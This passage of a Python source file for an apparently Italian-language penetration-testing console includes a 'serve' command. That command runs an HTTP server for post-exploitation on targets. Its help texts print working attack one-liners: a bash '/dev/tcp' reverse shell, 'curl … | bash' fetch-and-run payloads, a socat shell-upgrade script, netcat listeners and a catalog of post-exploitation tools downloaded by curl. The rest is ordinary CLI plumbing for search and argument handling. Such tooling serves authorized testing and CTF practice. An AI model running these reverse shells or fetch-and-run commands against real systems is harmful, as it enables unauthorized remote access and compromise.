            results.append(("notes", label, note_file, ctx))

    return results


def _extract_context(text: str, query_lower: str, context_lines: int = 1) -> list[str]:
    """Return lines surrounding each match for preview."""
    lines = text.splitlines()
    matched: list[str] = []
    for i, line in enumerate(lines):
        if query_lower in line.lower():
            start = max(0, i - context_lines)
            end = min(len(lines), i + context_lines + 1)
            snippet = " ".join(lines[start:end]).strip()
            if len(snippet) > 120:
                snippet = snippet[:117] + "..."
            matched.append(snippet)
            if len(matched) >= 3:
                break
    return matched


def _render_highlighted(text: str, query: str) -> None:
    lower_q = query.lower()
    output: list[str] = []
    for line in text.splitlines():
        idx = line.lower().find(lower_q)
        if idx >= 0:
            ql = len(query)
            output.append(line[:idx] + f"\033[94;1m{line[idx:idx+ql]}\033[0m" + line[idx+ql:])
        else:
            output.append(line)
    _paged_print(output)


def _serve_help_main() -> None:
    render_markdown(r"""# Quick-Delivery Server

Server HTTP in background per post-exploitation.
Serve payload dinamici e file statici via `curl` dal target.

## Comandi

| Comando | Descrizione |
|---------|-------------|
| `serve on [--port N] [--lhost IP] [--lport N]` | Avvia (default: porta 8000, IP auto) |
| `serve off` | Arresta |
| `serve status` | Mostra stato corrente |
| `serve fetch [--force]` | Scarica i tool di post-exploitation in `static/` |
| `serve list` | Elenca i file in `static/` |

## Categorie di help

| Comando | Argomento |
|---------|-----------|
| `serve help upgrade` (o `u`) | Come fare l'upgrade di una shell instabile |
| `serve help rev` (o `r`) | Reverse shell Bash |
| `serve help sh` | Reverse shell Python |
| `serve help static` (o `s`) | Gestione file statici e catalogo tool |
""")


def _serve_help_upgrade() -> None:
    render_markdown(r"""# /upgrade — Upgrade Shell

Trasforma una shell instabile (es. netcat `/bin/sh`) in una TTY interattiva.

## Uso

```bash
curl http://<LHOST>:8000/upgrade | bash
```

## Prerequisito

Avvia un listener **socat** sulla tua macchina prima di lanciare il curl:

```bash
socat file:$(tty),raw,echo=0 tcp-listen:4444
```

## Cosa fa lo script

Tenta tre metodi in cascata:

1. **socat locale** — se già installato sul target, upgrade immediato
2. **socat statico** — scarica un binario precompilato, lo usa da `/tmp`
3. **python pty** — fallback con `python3 -c "import pty; ..."`

La connessione torna verso `LHOST:LPORT` configurati con `serve on`.
""")


def _serve_help_rev() -> None:
    render_markdown(r"""# /rev — Reverse Shell Bash

One-liner bash per ottenere una reverse shell.

## Uso

```bash
curl http://<LHOST>:8000/rev | bash
```

## Prerequisito

Listener sulla tua macchina:

```bash
nc -lvnp 4444
```

## Payload generato

```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```

`LHOST` e `LPORT` sono quelli impostati con `serve on`.
""")


def _serve_help_sh() -> None:
    render_markdown(r"""# /sh — Reverse Shell Python

One-liner Python3 per ottenere una reverse shell.
Utile quando bash non supporta `/dev/tcp` (es. Debian/Ubuntu con `dash`).

## Uso

```bash
curl http://<LHOST>:8000/sh | bash
```

## Prerequisito

```bash
nc -lvnp 4444
```

## Quando usarlo

- Il target ha Python3 ma non bash con `/dev/tcp`
- Serve una shell più stabile rispetto a `/rev`
""")


def _serve_help_static() -> None:
    from http_server import TOOL_CATALOG, STATIC_ROOT, _lhost, _server
    if _server is not None:
        port = _server.server_address[1]
        base = f"http://{_lhost}:{port}"
    else:
        base = "http://<LHOST>:8000"

    lines = ["# static/ — File Statici\n"]
    lines.append("Cartella che il server serve come download diretto.")
    lines.append("Qualsiasi file dentro `static/` diventa scaricabile via HTTP.\n")
    lines.append("## Comandi\n")
    lines.append("| Comando | Descrizione |")
    lines.append("|---------|-------------|")
    lines.append("| `serve fetch` | Scarica tutti i tool del catalogo |")
    lines.append("| `serve fetch --force` | Riscarica anche se già presenti |")
    lines.append("| `serve list` | Mostra file e dimensioni |")
    lines.append("| `cp file static/` | Aggiungi un file manualmente |\n")
    lines.append("## Catalogo tool\n")
    lines.append("```bash")
    for entry in TOOL_CATALOG:
        name = entry["name"]
        if name.endswith(".sh"):
            lines.append(f"curl {base}/{name} | bash")
        elif name.endswith(".exe"):
            lines.append(f"curl {base}/{name} -o {name}")
        else:
            lines.append(f"curl {base}/{name} -o {name} && chmod +x {name}")
    lines.append("```")
    render_markdown("\n".join(lines))


_SERVE_HELP_TOPICS: dict[str, callable] = {
    "upgrade": _serve_help_upgrade,
    "u": _serve_help_upgrade,
    "rev": _serve_help_rev,
    "r": _serve_help_rev,
    "sh": _serve_help_sh,
    "static": _serve_help_static,
    "s": _serve_help_static,
}


def cmd_serve(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    action = normalize(getattr(args, "action", "status"))
    if action in {"help", "h", "-h", "--help"}:
        subtopic = getattr(args, "subtopic", None)
        if subtopic:
            handler = _SERVE_HELP_TOPICS.get(normalize(subtopic))
            if handler:
                handler()
            else:
                print(f"Categoria sconosciuta: {subtopic}")
                print("Categorie: upgrade (u), rev (r), sh, static (s)")
        else:
            _serve_help_main()
        return 0
    if action in {"on", "start"}:
        port = getattr(args, "port", 8000)
        lhost = getattr(args, "lhost", None)
        lport = getattr(args, "lport", 4444)

        if lhost is None:
            ifaces = _serve_discover_interfaces()
            if not ifaces:
                print("Nessuna interfaccia di rete trovata.", file=sys.stderr)
                return 1
            if len(ifaces) == 1:
                lhost = ifaces[0][1]
            else:
                print("\n  Interfacce disponibili:\n")
                for i, (name, addr) in enumerate(ifaces, 1):
                    print(f"    [{i}] {name:<12s}  {addr}")
                print()
                while True:
                    try:
                        choice = input("  Scegli interfaccia [1]: ").strip()
                    except (EOFError, KeyboardInterrupt):
                        print()
                        return 0
                    if not choice:
                        choice = "1"
                    if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
                        lhost = ifaces[int(choice) - 1][1]
                        break
                    print(f"  Inserisci un numero da 1 a {len(ifaces)}.")

        print(_serve_start(port=port, lhost=lhost, lport=lport))
        return 0
    if action in {"off", "stop"}:
        print(_serve_stop())
        return 0
    if action == "fetch":
        force = getattr(args, "force", False)
        print(_serve_fetch(force=force))
        return 0
    if action in {"list", "ls"}:
        print(_serve_list_static())
        return 0
    print(_serve_status())
    return 0


def cmd_find(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    query = " ".join(args.query) if isinstance(args.query, list) else args.query
    if not query.strip():
        print("Specifica una parola da cercare.", file=sys.stderr)
        return 1

    matches = _collect_find_matches(query)
    if not matches:
        print(f"Nessun risultato per '{query}'.")
        return 0

    type_labels = {"vuln": "vuln", "tool": "tool", "notes": "notes"}
    print(f"\nCorrispondenze per '\033[94m{query}\033[0m' ({len(matches)} trovate):\n")
    for i, (src, label, _, ctx) in enumerate(matches, 1):
        tag = type_labels[src]
        print(f"  [{i}] \033[90m[{tag}]\033[0m {label}")
        for snippet in ctx[:2]:
            print(f"       \033[2m{snippet}\033[0m")
    print(f"\nUsa 'use <num>' per aprire la pagina con il termine evidenziato in blu.")

    if state is not None:
        state._find_results = matches
        state._find_query = query.strip()

    return 0


def main(argv: list[str] | None = None) -> int:
    if argv is None:
        argv = sys.argv[1:]

    auto_update()
    _auto_install_deps()

    if not argv:
        return run_console()

    if len(argv) == 1 and argv[0] in {"-h", "--help"}:
        print_banner()
        print_help_text()
        return 0

    if len(argv) == 1 and argv[0] == "--version":
        print(f"{APP_NAME} {VERSION}")
        return 0

    return run_command(argv, ConsoleState())


def sealsay_main(argv: list[str] | None = None) -> int:
    if argv is None:
        argv = sys.argv[1:]

    parser = argparse.ArgumentParser(prog="sealsay", add_help=False)
    parser.add_argument("message", nargs="*")
    try:
        args = parser.parse_args(argv)
    except SystemExit:
        return 1

    return cmd_sealsay(args)


if __name__ == "__main__":
    raise SystemExit(main())
